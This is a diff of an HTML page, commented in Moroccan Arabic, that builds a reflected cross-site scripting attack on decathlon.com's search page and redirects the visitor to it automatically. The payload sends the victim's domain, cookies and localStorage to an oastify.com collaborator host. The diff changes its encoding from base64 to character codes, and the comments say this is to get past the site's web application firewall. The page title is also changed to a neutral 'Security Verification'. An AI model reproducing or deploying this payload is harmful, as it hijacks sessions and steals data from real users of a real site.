@@ -1,30 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Audit - Decathlon</title>
+    <title>Security Verification</title>
 </head>
 <body>
     <script>
-        // 1. هادا هو الكود (Payload) اللي جربتيه وخدم ليك فـ Console
-        // غادي نشفروه بـ Base64 باش يهرب من الـ WAF فـ الـ URL
-        var internalCode = `
+        // 1. هادا هو الكود اللي خدم ليك فـ Console (نفسه 100%)
+        let code = `
             alert("XSS Triggered on: " + document.domain);
-            var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
+            var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com"; 
             var data = btoa(JSON.stringify({
                 domain: document.domain,
-                cookies: document.cookie
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage)
             }));
-            fetch(collab + "/?success=" + data, {mode: 'no-cors'});
+            fetch(collab + "/?alert_success=" + data, {mode: 'no-cors'});
         `;
 
-        var encoded = btoa(internalCode);
+        // 2. تحويل الكود لأرقام (Decimal) باش نهربو من الـ WAF
+        let charCode = code.split('').map(c => c.charCodeAt(0)).join(',');
 
-        // 2. الرابط المعتوب باستعمال Tag Injection اللي نفعك
-        // استعملنا eval(atob()) باش ننفذو الكود المشفر وسط Decathlon
-        var finalUrl = "https://www.decathlon.com/search?q=</h1></title><svg/onload=eval(atob('" + encoded + "'))>";
+        // 3. بناء الرابط باستعمال eval(String.fromCharCode(...))
+        // هكا الرابط ما فيه لا < لا > لا ' لا "
+        let payload = "</h1></title><svg/onload=eval(String.fromCharCode(" + charCode + "))>";
+        
+        let target = "https://www.decathlon.com/search?q=" + encodeURIComponent(payload);
 
-        // 3. تنفيذ الهجوم التلقائي
-        window.location.href = finalUrl;
+        // 4. تنفيذ الهجوم
+        window.location.href = target;
     </script>
 </body>
 </html>
